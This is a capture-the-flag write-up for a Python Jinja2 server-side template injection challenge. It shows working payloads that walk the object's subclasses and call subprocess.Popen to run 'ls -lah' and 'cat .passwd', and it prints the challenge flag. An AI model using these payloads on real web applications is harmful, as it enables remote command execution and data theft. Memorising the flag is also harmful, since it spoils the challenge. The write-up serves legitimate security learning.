Solution: Template Injection Vulnerability Exploitation

![serverside](https://github.com/hamid-sheibani/challenges/assets/78083936/e2cea6c3-3cf8-403f-8744-05a59cb459d9)


Overview:
In this challenge, we encountered two input fields requiring template injection testing. Given the Python-based nature of the application, we opted to test for vulnerabilities in Jinja2, a prevalent template engine. Here's how we proceeded:

Step 1: Identifying Jinja2 Functions:
We utilized the following payload to access Jinja2 functions used in the program:

markdown

{{ ''.__class__.__mro__[1].__subclasses__() }}

Explanation:

    '': This is an empty string. It's used as a starting point to access attributes and methods.
    .__class__: This accesses the class of an object. In this case, the empty string.
    .__mro__: This accesses the method resolution order (MRO) of the class, which is a tuple of classes the class inherits from.
    [1]: This accesses the second element in the MRO tuple. In Python, the second element of the MRO tuple typically refers to the superclass of the class.
    .__subclasses__(): This retrieves a list of all subclasses of the specified class.

Output of the above payload provides us with all classes. We then copied them into a file and searched for the object class using the following Linux commands:

bash

sed 's/\\,/\\n/g' list.txt > new_list.txt
cat -n new_list.txt | grep object

This helped us identify subprocess.Popen() at index 408.

Step 2: Executing Commands:
To execute commands such as ls -lah and view all files, including hidden ones, we crafted the following payload:

scss

{{ ''.__class__.__mro__[1].__subclasses__()[408]("ls -lah", shell=True, stdout=-1).communicate() }}

Executing this payload returned the contents of the .passwd file, revealing sensitive information.

Step 3: Retrieving the Flag:
Lastly, we utilized a similar payload to read the .passwd file and uncovered the flag:

scss

{{ ''.__class__.__mro__[1].__subclasses__()[408]("cat .passwd", shell=True, stdout=-1).communicate() }}

This returned the flag: Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!

                    


